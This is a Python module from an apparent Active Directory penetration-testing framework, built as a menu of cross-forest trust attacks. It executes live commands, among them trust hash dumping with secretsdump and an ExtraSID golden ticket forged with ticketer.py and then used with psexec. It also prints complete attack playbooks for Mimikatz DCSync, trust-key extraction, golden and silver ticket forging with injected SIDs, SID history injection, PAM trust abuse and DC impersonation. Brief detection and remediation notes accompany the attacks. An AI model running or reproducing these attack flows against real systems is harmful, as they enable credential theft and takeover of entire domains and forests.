"""
Module: Trust Attacks — Cross-forest / SID History / ExtraSID / PAC
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("TRUST ATTACKS", "Cross-Forest / SID History / PAC Forgery")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Current Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")
    base_dn = "DC=" + dom.replace(".", ",DC=")

    print("""
  [1]  Enumerate Domain Trusts
  [2]  Cross-Forest Kerberoasting
  [3]  ExtraSID Attack (inter-realm Golden Ticket)
  [4]  Foreign Group Membership
  [5]  Dump Trust Keys
  [6]  Golden Ticket Cross-Forest /SIDS: (Invoke-Mimi full flow)
  [7]  Child → Parent Escalation via SID History
  [8]  PAM Trust Abuse             (Bastion Forest / Shadow Principals)
  [9]  Multi-Hop Referral TGT Chain (Rubeus 4-step forest traversal)
  [10] Foreign Security Principals (FSP enum & escalation)
  [11] Trust Key Extraction         (lsadump::trust → cross-forest Silver Ticket)
  [12] SID History DC Impersonation (Rubeus golden /user:dc$ /sids:S-1-5-9)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        run_cmd(f"ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' -b '{base_dn}' '(objectClass=trustedDomain)' trustDirection trustPartner flatName")

    elif c == "2":
        trusted = prompt("Foreign/Trusted domain")
        run_cmd(f"{imp('GetUserSPNs.py')} -target-domain {trusted} {dom}/{user}:'{pw}' -dc-ip {dc} -request -outputfile /tmp/cross_spns.txt")

    elif c == "3":
        krbtgt_h   = prompt("Current domain krbtgt NTLM hash")
        dom_sid    = prompt("Current domain SID")
        target_sid = prompt("Target domain root SID")
        parent_dom = prompt("Parent/Target domain FQDN")
        parent_dc  = prompt("Parent DC IP")
        run_cmd(f"{imp('ticketer.py')} -nthash {krbtgt_h} -domain-sid {dom_sid} -domain {dom} -extra-sid {target_sid}-519 -user-id 500 Administrator")
        info("export KRB5CCNAME=Administrator.ccache")
        run_cmd(f"{imp('psexec.py')} {parent_dom}/Administrator@{parent_dc} -k -no-pass")
        add_finding("Cross-Forest ExtraSID Attack", "Critical",
                    "Inter-realm ticket forged with parent DA SID injected",
                    "Enable SID filtering on all forest trusts")

    elif c == "4":
        target_dom = prompt("Foreign domain")
        target_dn  = "DC=" + target_dom.replace(".", ",DC=")
        run_cmd(f"ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' -b '{target_dn}' '(member=*)' cn member")

    elif c == "5":
        run_cmd(f"{imp('secretsdump.py')} {dom}/{user}:'{pw}'@{dc} -just-dc-ntlm | grep -i trust")

    elif c == "6":
        child_dom  = prompt("Child domain FQDN (e.g. tech.finance.corp)")
        parent_dom = prompt("Parent/root domain FQDN (e.g. finance.corp)")
        child_dc   = prompt("Child DC IP")
        parent_dc  = prompt("Parent DC IP")
        print(f"""
  {NEON_CYN}Golden Ticket Cross-Forest — /SIDS: Enterprise Admins (CRTP){RST}

  ── Step 1: Dump child domain krbtgt from child DC ───────────────────────
  # On child DC (as DA or with DCSync rights)
  Invoke-Mimi -Command '"lsadump::lsa /patch"'

  # Or DCSync (no DA logon needed — just DCSync right):
  Invoke-Mimi -Command '"lsadump::dcsync /user:{child_dom}\\krbtgt"'

  ── Step 2: Collect SIDs ──────────────────────────────────────────────────
  # Child domain SID
  Get-DomainSID                               # child: {child_dom}
  # Parent domain SID (Enterprise Admins = <parentSID>-519)
  Get-DomainSID -Domain {parent_dom}

  ── Step 3: Forge inter-realm Golden Ticket with /SIDS ───────────────────
  # PowerView / Invoke-Mimi on any machine (can run from student box)
  Invoke-Mimi -Command '"kerberos::golden /User:Administrator /domain:{child_dom} /SID:<childSID> /SIDS:<parentSID>-519 /krbtgt:<krbtgt_hash> /ticket:C:\\ad\\tools\\krb_tgt.kirbi"'

  # Pass the ticket
  Invoke-Mimi -Command '"kerberos::ptt C:\\ad\\tools\\krb_tgt.kirbi"'

  # Verify access to parent DC
  ls \\\\{parent_dc}\\c$

  ── Step 4: DA on parent domain ──────────────────────────────────────────
  Enter-PSSession -ComputerName {parent_dc} -Authentication NegotiateWithImplicitCredential

  # Or invoke command
  Invoke-Command -ComputerName {parent_dc} -ScriptBlock {{hostname; whoami}}

  {NEON_CYN}Impacket alternative (Linux):{RST}
  impacket-ticketer -nthash <krbtgt_hash> -domain-sid <childSID> -domain {child_dom} \\
    -extra-sid <parentSID>-519 -user-id 500 Administrator
  export KRB5CCNAME=Administrator.ccache
  impacket-psexec {parent_dom}/Administrator@{parent_dc} -k -no-pass

  {DIM}• /SIDS: injects ExtraSID into PAC → target domain sees Enterprise Admins membership
  • SID filtering (quarantine) blocks this — check: Get-DomainTrust | select SIDFilteringQuarantined
  • Works across bidirectional and one-way trusts (if SID filtering disabled)
  • Enterprise Admins SID = <forestRootSID>-519{RST}
""")
        add_finding("Cross-Forest Golden Ticket /SIDS:", "Critical",
                    f"Forged inter-realm ticket with Enterprise Admins SID ({parent_dom}-519) injected via child domain krbtgt",
                    "Enable SID filtering (quarantine) on all cross-domain trusts; rotate krbtgt annually")

    elif c == "7":
        child_dom  = prompt("Child domain FQDN")
        parent_dom = prompt("Parent domain FQDN")
        parent_dc  = prompt("Parent DC IP")
        print(f"""
  {NEON_CYN}Child → Parent Escalation via SID History Injection:{RST}

  # This leverages SID History attribute to add Enterprise Admins SID
  # Requires DA in child domain

  ── Using Mimikatz misc::addsid ───────────────────────────────────────────
  # Get Enterprise Admins SID of parent
  Get-DomainSID -Domain {parent_dom}

  # Add SID history to our user (requires DA)
  Invoke-Mimi -Command '"misc::addsid /sam:{user} /sids:<parentSID>-519"'

  ── Verify & use ─────────────────────────────────────────────────────────
  # Confirm SID history was added
  Get-ADUser {user} -Properties SIDHistory | select Name,SIDHistory

  # Now authenticate to parent DC — ticket will include ExtraSID
  Enter-PSSession -ComputerName {parent_dc} -Authentication NegotiateWithImplicitCredential
  ls \\\\{parent_dc}\\c$

  {NEON_CYN}Detection:{RST}
  {DIM}• Event ID 4765 — SID History added to account
  • Event ID 4766 — SID History add attempt failed
  • Monitor msDS-SidHistory attribute changes{RST}
""")
        add_finding("SID History Injection Child→Parent", "Critical",
                    f"SID history abused to escalate from {child_dom} to {parent_dom} Enterprise Admins",
                    "Audit SID History attributes; enable SID filtering on trust; alert on Event 4765")

    elif c == "8":
        bastion_dom = prompt("Bastion/Red Forest domain FQDN")
        prod_dom    = prompt("Production domain FQDN")
        bastion_dc  = prompt("Bastion DC IP")
        print(f"""
  {NEON_CYN}PAM Trust (Privileged Access Management) Abuse:{RST}

  {DIM}PAM trust = one-way forest trust from production → bastion/red forest.
  Shadow Principals in bastion are mapped to production privileged accounts.
  If bastion forest is compromised → production forest is compromised.{RST}

  ── Step 1: Enumerate PAM trusts ──────────────────────────────────────────
  # Check for ForestTransitive + SIDFilteringQuarantined=$false
  Get-ADTrust -Filter {{(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}}

  # Remote (from bastion PSSession):
  $bastion = New-PSSession -ComputerName {bastion_dc} -Credential {bastion_dom}\\Administrator
  Invoke-Command -Session $bastion -ScriptBlock {{
    Get-ADTrust -Filter {{(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}}
  }}

  ── Step 2: Enumerate Shadow Principals ───────────────────────────────────
  # From bastion DC (or via PSSession):
  Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,$(Get-ADRootDSE | select -ExpandProperty configurationNamingContext)" \\
    -Filter * -Properties member,'msDS-ShadowPrincipalSid' |
    select Name,member,'msDS-ShadowPrincipalSid'

  # Identify which production accounts are mapped to bastion accounts
  # msDS-ShadowPrincipalSid = SID of the production account being shadowed

  ── Step 3: Abuse (if you own bastion account in Shadow Principal) ─────────
  # If your bastion account is in a Shadow Principal mapped to production DA:
  # → You already have DA rights in production via PAM trust
  Enter-PSSession -ComputerName <prod_dc> \\
    -Credential {bastion_dom}\\<your_bastion_account>

  # Check effective access:
  Invoke-Command -ComputerName <prod_dc> -ScriptBlock {{whoami; whoami /groups}}

  ── Step 4: Full escalation from bastion → production ─────────────────────
  # DCSync production domain using bastion DA account:
  Invoke-Mimi -Command '"lsadump::dcsync /user:{prod_dom}\\krbtgt /domain:{prod_dom}"'

  {NEON_CYN}Detection:{RST}
  {DIM}• Enumerate CN=Shadow Principal Configuration in bastion config NC
  • PAM trusts visible in Get-ADTrust output as ForestTransitive
  • Logon from bastion accounts to production appears as cross-forest auth{RST}
""")
        add_finding("PAM Trust Abuse", "Critical",
                    f"Shadow Principals in bastion forest {bastion_dom} mapped to production {prod_dom} — bastion compromise = production compromise",
                    "Harden bastion forest with same rigor as production; audit Shadow Principals; monitor cross-forest auth from bastion accounts")

    elif c == "9":
        eu_dom  = prompt("Source/entry domain FQDN (e.g. eu.local)")
        us_dom  = prompt("Intermediate domain FQDN (e.g. us.techcorp.local)")
        root_dom = prompt("Target root domain FQDN (e.g. techcorp.local)")
        eu_dc   = prompt("Source DC IP/FQDN")
        us_dc   = prompt("Intermediate DC IP/FQDN")
        root_dc = prompt("Target root DC IP/FQDN")
        target_svc = prompt("Target service SPN (e.g. cifs/techcorp-dc.techcorp.local)")
        print(f"""
  {NEON_CYN}Multi-Hop Forest Trust Referral TGT Chain (Rubeus):{RST}

  {DIM}When forests have transitive trusts, Kerberos issues referral tickets
  at each hop. By chaining these, you can traverse multiple forests.
  Requires: DA in {eu_dom} → target access in {root_dom}.{RST}

  ── Prerequisites ─────────────────────────────────────────────────────────
  # Have a valid TGT for {eu_dom} (as DA or high-priv user)
  Rubeus.exe triage   # show current tickets

  ── Step 1: Request referral TGT from {eu_dom} → {us_dom} ────────────────
  Rubeus.exe asktgs \\
    /service:krbtgt/{us_dom} \\
    /dc:{eu_dc} \\
    /ticket:<eu_tgt_base64> \\
    /nowrap

  ── Step 2: Request local TGT for {us_dom} using referral ────────────────
  Rubeus.exe asktgs \\
    /service:krbtgt/{us_dom} \\
    /dc:{us_dc} \\
    /targetdomain:{us_dom} \\
    /ticket:<step1_referral_base64> \\
    /nowrap

  ── Step 3: Request referral TGT from {us_dom} → {root_dom} ──────────────
  Rubeus.exe asktgs \\
    /service:krbtgt/{root_dom} \\
    /dc:{us_dc} \\
    /targetdomain:{us_dom} \\
    /ticket:<step2_local_tgt_base64> \\
    /nowrap

  ── Step 4: Request final service ticket for {target_svc} ─────────────────
  Rubeus.exe asktgs \\
    /service:{target_svc} \\
    /dc:{root_dc} \\
    /ticket:<step3_referral_base64> \\
    /nowrap /ptt

  ── Step 5: Use the ticket ────────────────────────────────────────────────
  ls \\\\{root_dc}\\c$
  Enter-PSSession -ComputerName {root_dc}

  {NEON_CYN}One-liner shortcut (if SID filtering disabled):{RST}
  # Use Golden Ticket with /SIDS: instead (faster — see option [6])

  {DIM}Key insight: each referral TGT hop uses the inter-realm trust key.
  SID filtering at each hop may block ExtraSID injection (check TrustAttributes).{RST}
""")
        add_finding("Multi-Hop Referral TGT Chain", "Critical",
                    f"Forest trust chain traversed: {eu_dom} → {us_dom} → {root_dom} via Kerberos referral tickets",
                    "Enable SID filtering on all trust relationships; monitor cross-forest TGT referral requests; audit trust configurations")

    elif c == "10":
        target_dom = prompt("Domain to enumerate FSPs in")
        print(f"""
  {NEON_CYN}Foreign Security Principals (FSP) Enumeration & Abuse:{RST}

  {DIM}FSPs represent security principals from trusted external domains.
  They are created in CN=ForeignSecurityPrincipals when a cross-domain
  account is added to a local group. Abusing FSP group memberships
  can grant unexpected privileges in the target domain.{RST}

  ── Enumerate FSP objects ─────────────────────────────────────────────────
  # AD Module
  Get-ADObject -Filter {{objectClass -eq "foreignSecurityPrincipal"}} \\
    -SearchBase "CN=ForeignSecurityPrincipals,{base_dn}" \\
    -Properties * | select Name,objectSid,memberOf

  # PowerView
  Get-DomainForeignGroupMember -Domain {target_dom or dom}
  Get-DomainForeignUser -Domain {target_dom or dom}

  # LDAP (Linux)
  ldapsearch -x -H ldap://{dc} -D '{user}@{dom}' -w '{pw}' \\
    -b 'CN=ForeignSecurityPrincipals,{base_dn}' \\
    '(objectClass=foreignSecurityPrincipal)' \\
    distinguishedName objectSid memberOf

  ── Resolve FSP SID to actual account ────────────────────────────────────
  # Resolve which account each FSP represents:
  Get-ADObject -Filter {{objectClass -eq "foreignSecurityPrincipal"}} \\
    -Properties objectSid | ForEach-Object {{
      try {{
        $sid = New-Object System.Security.Principal.SecurityIdentifier($_.objectSid)
        $acct = $sid.Translate([System.Security.Principal.NTAccount])
        [pscustomobject]@{{DN=$_.DistinguishedName; Account=$acct.Value; SID=$sid}}
      }} catch {{}}
    }}

  ── Find FSPs with privileged group membership ────────────────────────────
  Get-ADGroupMember -Identity "Domain Admins" -Recursive |
    Where-Object {{$_.objectClass -eq "foreignSecurityPrincipal"}}

  Get-ADGroupMember -Identity "Administrators" -Recursive |
    Where-Object {{$_.objectClass -eq "foreignSecurityPrincipal"}}

  ── Abuse: if you control the external account → access target domain ──────
  # If an FSP from your controlled domain is in Domain Admins:
  crackmapexec smb {dc} -u '{user}' -p '{pw}' -d {dom}
  # → Full DA access via cross-domain group membership

  {NEON_CYN}ACL abuse on FSP objects: ───────────────────────────────────────{RST}
  # If GenericWrite on FSP → add foreign account to privileged group:
  Add-DomainGroupMember -Identity "Domain Admins" -Members '<foreign_SID>'
""")
        add_finding("Foreign Security Principal Abuse", "High",
                    f"FSP from external domain found with privileged group membership in {target_dom or dom}",
                    "Audit CN=ForeignSecurityPrincipals; review all cross-domain group memberships; restrict SID filtering on trusts")

    elif c == "11":
        trust_target = prompt("Trusted/foreign domain FQDN (e.g. eurocorp.local)")
        trust_dc     = prompt("DC IP of trusted domain")
        print(f"""
  {NEON_CYN}Trust Key Extraction — lsadump::trust → Cross-Forest Silver Ticket:{RST}

  {DIM}Each domain trust relationship has a shared secret (trust key) stored in
  the TDO (Trusted Domain Object). Extracting these keys allows forging
  inter-realm tickets (referral TGTs) to access resources in the trusted domain.{RST}

  ── Step 1: Extract trust keys from DC ────────────────────────────────────
  {Y}Mimikatz (run on DC as DA / LocalSystem):{RST}
  Invoke-Mimi -Command '"lsadump::trust /patch"' -ComputerName {dc}

  {Y}Output to look for:{RST}
  # [  In ] {dom} -> {trust_target}
  #   * aes256_hmac: <aes256_key>
  #   * rc4_hmac_md4: <rc4_hash>   ← use this for RC4 silver ticket

  {Y}Alternatively — dump TDO from LDAP (offline, as DA):{RST}
  impacket-secretsdump {dom}/{user}:'{pw}'@{dc} -just-dc -outputfile /tmp/secrets

  ── Step 2: Forge inter-realm TGT using trust key ─────────────────────────
  {Y}Rubeus (AES256 key):{RST}
  Rubeus.exe golden \\
    /aes256:<trust_aes256_key> \\
    /user:Administrator \\
    /domain:{dom} \\
    /sid:<current_domain_sid> \\
    /service:krbtgt \\
    /target:{trust_target} \\
    /rc4opsec /nowrap /ptt

  {Y}Mimikatz (RC4 key — inter-realm ticket):{RST}
  kerberos::golden \\
    /user:Administrator \\
    /domain:{dom} \\
    /sid:<current_domain_sid> \\
    /rc4:<trust_rc4_key> \\
    /service:krbtgt \\
    /target:{trust_target} \\
    /ticket:inter-realm.kirbi

  kerberos::ptt inter-realm.kirbi

  ── Step 3: Request TGS in trusted domain using inter-realm ticket ─────────
  {Y}Rubeus (request service ticket in {trust_target}):{RST}
  Rubeus.exe asktgs \\
    /service:cifs/{trust_dc} \\
    /dc:{trust_dc} \\
    /ticket:<inter_realm_base64> \\
    /nowrap /ptt

  {Y}Access {trust_target} resources:{RST}
  ls \\\\{trust_dc}\\c$
  Enter-PSSession -ComputerName {trust_dc}

  ── Step 4: Silver Ticket directly (skip TGS request) ─────────────────────
  {Y}Forge Silver Ticket for specific service using trust RC4:{RST}
  kerberos::golden \\
    /user:Administrator \\
    /domain:{dom} \\
    /sid:<current_domain_sid> \\
    /rc4:<trust_rc4_key> \\
    /service:cifs \\
    /target:{trust_dc} \\
    /ptt

  {NEON_YEL}OPSEC note:{RST} {DIM}Trust key extraction requires DA on the source domain DC.
  Inter-realm tickets using trust keys do NOT touch the krbtgt — harder to detect.
  SID filtering on the trust may block ExtraSID injection into forged tickets.{RST}
""")
        add_finding("Trust Key Extraction", "Critical",
                    f"Trust keys extracted from {dc} — inter-realm tickets can be forged for {trust_target}",
                    "Monitor lsadump::trust activity; audit TDO objects; enable SID filtering on all trust relationships")

    elif c == "12":
        dc_name      = prompt("DC hostname$ (e.g. us-dc$)")
        child_sid    = prompt("Child domain SID (S-1-5-21-...)")
        child_krbtgt = prompt("Child domain krbtgt NTLM hash (RC4)")
        parent_dom   = prompt("Parent/root domain FQDN")
        print(f"""
  {NEON_CYN}SID History DC Impersonation — Rubeus golden /user:dc$ /sids:S-1-5-9:{RST}

  {DIM}By forging a Golden Ticket for a Domain Controller machine account with
  SID S-1-5-9 (Enterprise Domain Controllers) injected via /sids:, you can
  impersonate the DC itself and perform DCSync, replicate AD data, etc.
  This bypasses protections that check for human account TGTs.{RST}

  ── Prerequisite: DC SIDs ─────────────────────────────────────────────────
  {Y}Get Enterprise Domain Controllers SID:{RST}
  # S-1-5-9 is a well-known SID for Enterprise Domain Controllers group
  # Also inject the DC machine account SID:
  Get-ADComputer -Identity '{dc_name.rstrip("$")}' -Properties SID | select SID

  ── Step 1: Forge Golden Ticket for DC machine account ────────────────────
  {Y}Rubeus:{RST}
  Rubeus.exe golden \\
    /user:{dc_name} \\
    /rc4:{child_krbtgt} \\
    /domain:{dom} \\
    /sid:{child_sid} \\
    /sids:S-1-5-21-<parent_dom_sid>-516,S-1-5-9 \\
    /nowrap /ptt

  {Y}With AES256 (stealthier):{RST}
  Rubeus.exe golden \\
    /user:{dc_name} \\
    /aes256:<krbtgt_aes256> \\
    /domain:{dom} \\
    /sid:{child_sid} \\
    /sids:S-1-5-21-<parent_dom_sid>-516,S-1-5-9 \\
    /rc4opsec /nowrap /ptt

  {Y}Mimikatz equivalent:{RST}
  kerberos::golden \\
    /user:{dc_name} \\
    /domain:{dom} \\
    /sid:{child_sid} \\
    /krbtgt:{child_krbtgt} \\
    /sids:S-1-5-21-<parent_sid>-516,S-1-5-9 \\
    /ptt

  ── Step 2: DCSync as impersonated DC ─────────────────────────────────────
  {Y}DCSync using the forged DC ticket:{RST}
  Invoke-Mimi -Command '"lsadump::dcsync /user:{parent_dom}\\krbtgt /domain:{parent_dom}"'
  Invoke-Mimi -Command '"lsadump::dcsync /user:{parent_dom}\\Administrator /domain:{parent_dom}"'

  {Y}Or via impacket (Linux):{RST}
  export KRB5CCNAME=<forged_ticket.ccache>
  impacket-secretsdump -k -no-pass {parent_dom}/<dc_name>@<parent_dc_ip> \\
    -just-dc-ntlm

  ── Why /sids:S-1-5-9 is significant ─────────────────────────────────────
  {DIM}• S-1-5-9 = Enterprise Domain Controllers (well-known SID)
  • S-1-5-21-<parent>-516 = Domain Controllers group in parent domain
  • These SIDs give the forged ticket DC-level replication rights in parent domain
  • Bypasses checks that validate the ticket belongs to a human account
  • Different detection profile from standard ExtraSID attack (option [3]){RST}

  {NEON_YEL}Detection:{RST} {DIM}Monitor for machine account (ending in $) TGT requests
  from non-DC systems; alert on SID 516/S-1-5-9 in PAC of non-DC tickets;
  rotate krbtgt TWICE to invalidate.{RST}
""")
        add_finding("SID History DC Impersonation", "Critical",
                    f"Golden Ticket forged for {dc_name} with /sids:S-1-5-9 — DC impersonation in {parent_dom}",
                    "Rotate krbtgt twice; enable SID filtering; monitor machine account TGTs from non-DC sources; detect S-1-5-9 in PAC for user accounts")

    pause()
